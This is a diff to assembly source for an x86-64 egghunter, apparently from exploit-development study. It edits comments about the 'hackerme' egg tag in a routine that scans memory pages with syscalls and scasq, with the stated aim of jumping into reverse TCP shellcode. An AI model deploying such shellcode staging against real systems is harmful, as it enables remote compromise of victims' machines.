@@ -19,7 +19,7 @@ _start:
 	; This is our egghuter
 	; it needs to search for 
 	; 2 consecutive instances
-	; of our 'hack' string
+	; of our 'hackerme' string
 	; and then jump into, and execute
 	; our reverse TCP shellcode
 	;
@@ -46,7 +46,7 @@ hunter:
 	syscall				; call it
 	cmp al, 0xf2			; compare the return value in rax
 	jz page_alignment		; short jump to next page if ZF set
-	mov rax, 0x656d72656b636168	; copy our comparison string into eax
+	mov rax, 0x656d72656b636168	; copy 'hackerme' into rax
 	mov rdi, rdx			; mov our value in rdx into rdi
 	scasq				; compare rax with dword at rdi (in other words, check to see if we have 2 consecutive strings)
 	jnz incrementer			; short jump if ZF not set (no match)
